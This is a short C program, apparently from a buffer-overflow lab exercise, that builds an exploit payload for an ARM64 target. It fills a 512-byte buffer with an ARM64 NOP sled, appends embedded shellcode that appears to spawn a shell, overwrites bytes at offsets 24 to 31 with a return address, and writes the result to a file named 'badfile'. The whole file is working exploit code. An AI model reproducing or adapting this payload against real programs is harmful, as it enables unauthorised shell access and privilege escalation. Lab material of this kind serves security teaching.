#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";


void print_buffer(char *buffer, int size) {
	for (size_t i = 0; i < size; i++) {
		printf("\\x%02x", (unsigned char)buffer[i]);
	}
	printf("\n");
}

void set_pattern(void *buffer, size_t size, unsigned int pattern) {
    unsigned int *ptr = (unsigned int *)buffer;
    size_t num_elements = size / sizeof(unsigned int);
    for (size_t i = 0; i < num_elements; ++i) {
        ptr[i] = pattern;
    }
}


int main(int argc, char ** argv) {
	char buffer[512];

	FILE *badfile;

	/* Init the buffer with nop (0x90)
		nop in ARM64 is 0xD503201F */
	set_pattern(buffer, 512, 0xD503201F);
	print_buffer(buffer, 512);

	/* Put the shellcode at the end */
	int shellcode_size = sizeof(shellcode) - 1;
	int offset = sizeof(buffer) - shellcode_size;  // 将 offset 设置为 buffer 尾部
	if (offset >= 0) {
		memcpy(buffer + offset, shellcode, shellcode_size);
	} else {
		printf("Error: Shellcode exceeds buffer size.\n");
	}


	// buffer[24] = 0x48;
    // buffer[25] = 0xe9;
	buffer[24] = 0xf8;
	buffer[25] = 0xea;
    buffer[26] = 0xff;
    buffer[27] = 0xff;

	buffer[28] = 0xff;
	buffer[29] = 0xff;
	buffer[30] = 0x00;
	buffer[31] = 0x00;

	print_buffer(buffer, 512);

	/* Save to badfile. */
	badfile = fopen("badfile", "w+");
	fwrite(buffer, 512, 1, badfile);
	fclose(badfile);

	printf("Completed writing\n");

	return 0;
}
